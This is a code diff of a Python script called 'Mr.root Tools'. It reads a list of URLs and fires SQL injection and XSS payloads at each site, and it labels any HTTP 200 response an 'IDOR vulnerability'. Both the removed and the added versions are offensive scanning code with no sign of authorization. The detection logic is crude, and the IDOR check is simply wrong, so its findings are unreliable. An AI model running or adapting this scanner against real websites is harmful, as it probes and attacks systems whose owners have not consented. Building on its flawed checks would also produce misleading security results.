@@ -1,83 +1,78 @@
+import os
 import requests
 import pyfiglet
-from termcolor import colored
-from tabulate import tabulate
+from colorama import Fore, init
 
-# Define payloads for the vulnerabilities
-sql_injection_payloads = ["' OR 1=1 --", "' OR 'a'='a", "1' OR 'a'='a", "1' OR 1=1"]
-xss_payloads = ['<script>alert(1)</script>', '<img src="x" onerror="alert(1)">']
-idor_payloads = ['/admin', '/config', '/user/profile']
+# Initialize colorama
+init(autoreset=True)
 
-# Function to print the Mr.root banner
-def print_banner():
-    ascii_banner = pyfiglet.figlet_format("Mr.root")
-    print(colored(ascii_banner, 'cyan'))
+# Print the banner with pyfiglet
+ascii_banner = pyfiglet.figlet_format("Mr.root Tools")
+print(Fore.CYAN + ascii_banner)
 
-# Function to test SQL Injection
-def test_sql_injection(url):
-    results = []
-    for payload in sql_injection_payloads:
-        response = requests.get(url + payload)
-        if "error" in response.text or "syntax" in response.text or response.status_code == 500:
-            results.append(("SQL Injection", url, payload, url + payload))
-    return results
-
-# Function to test XSS
-def test_xss(url):
-    results = []
-    for payload in xss_payloads:
-        response = requests.get(url + payload)
-        if payload in response.text:
-            results.append(("XSS", url, payload, url + payload))
-    return results
-
-# Function to test IDOR
-def test_idor(url):
-    results = []
-    for payload in idor_payloads:
-        response = requests.get(url + payload)
-        if response.status_code == 200:
-            results.append(("IDOR", url, payload, url + payload))
-    return results
-
-# Function to scan the website
-def scan_website(url):
-    results = []
-    print(colored(f"Scanning {url}...", 'blue'))
-    results.extend(test_sql_injection(url))
-    results.extend(test_xss(url))
-    results.extend(test_idor(url))
-    return results
-
-# Main function to scan websites from the list
-def main():
-    print_banner()
-    # Ask for the name of the list file
-    list_filename = input(colored("Enter the name of the list file (e.g., list.txt): ", 'yellow'))
-
+# Function to check for IDOR vulnerability
+def check_idor(url):
+    print(Fore.YELLOW + "[*] Checking for IDOR on the URL:", url)
     try:
-        with open(list_filename, "r") as file:
-            urls = file.readlines()
-
-        all_results = []
-        for url in urls:
-            url = url.strip()
-            # Ensure the URL starts with http:// or https://
-            if not url.startswith("http"):
-                url = "http://" + url
-            results = scan_website(url)
-            all_results.extend(results)
-
-        if all_results:
-            # Print results in a table
-            headers = ["Vulnerability", "Website", "Payload", "Path"]
-            table = tabulate(all_results, headers, tablefmt="grid", numalign="center", stralign="center")
-            print(colored(table, 'green'))
+        response = requests.get(url)
+        if response.status_code == 200:
+            print(Fore.GREEN + f"[+] IDOR vulnerability found in: {url}")
         else:
-            print(colored("No vulnerabilities found.", 'green'))
-    except FileNotFoundError:
-        print(colored(f"Error: The file '{list_filename}' was not found!", 'red'))
+            print(Fore.RED + "[-] No IDOR found")
+    except requests.exceptions.RequestException as e:
+        print(Fore.RED + "[-] Connection failed:", e)
 
-# Run the script
+# Function to check for SQL Injection vulnerability
+def check_sql_injection(url):
+    print(Fore.YELLOW + "[*] Checking for SQL Injection on the URL:", url)
+    payloads = ["' OR 1=1 --", "' OR 'a'='a", "' UNION SELECT null--"]
+    for payload in payloads:
+        try:
+            test_url = url + payload
+            response = requests.get(test_url)
+            if "error" in response.text or "SQL syntax" in response.text:
+                print(Fore.GREEN + f"[+] SQL Injection found in {url} with payload: {payload}")
+                print(Fore.GREEN + f"Vulnerable path: {test_url}")
+                return
+        except requests.exceptions.RequestException as e:
+            print(Fore.RED + "[-] Connection failed:", e)
+    print(Fore.RED + "[-] No SQL Injection found")
+
+# Function to check for XSS vulnerability
+def check_xss(url):
+    print(Fore.YELLOW + "[*] Checking for XSS on the URL:", url)
+    payloads = ['<script>alert("XSS")</script>', '<img src="x" onerror="alert(1)">']
+    for payload in payloads:
+        try:
+            test_url = url + payload
+            response = requests.get(test_url)
+            if payload in response.text:
+                print(Fore.GREEN + f"[+] XSS found in {url} with payload: {payload}")
+                print(Fore.GREEN + f"Vulnerable path: {test_url}")
+                return
+        except requests.exceptions.RequestException as e:
+            print(Fore.RED + "[-] Connection failed:", e)
+    print(Fore.RED + "[-] No XSS found")
+
+# Main function to read the URLs from the file and scan them
+def main():
+    file_path = input(Fore.CYAN + "Enter the path to the list file (list.txt): ").strip()
+    if not os.path.exists(file_path):
+        print(Fore.RED + "The file does not exist!")
+        return
+
+    with open(file_path, "r") as file:
+        urls = file.readlines()
+        
+    print(Fore.CYAN + "[*] Starting the scan for all sites in the list...")
+    
+    for url in urls:
+        url = url.strip()
+        if url:
+            print(Fore.CYAN + f"\n[*] Scanning site: {url}")
+            check_idor(url)
+            check_sql_injection(url)
+            check_xss(url)
+
 if __name__ == "__main__":
     main()
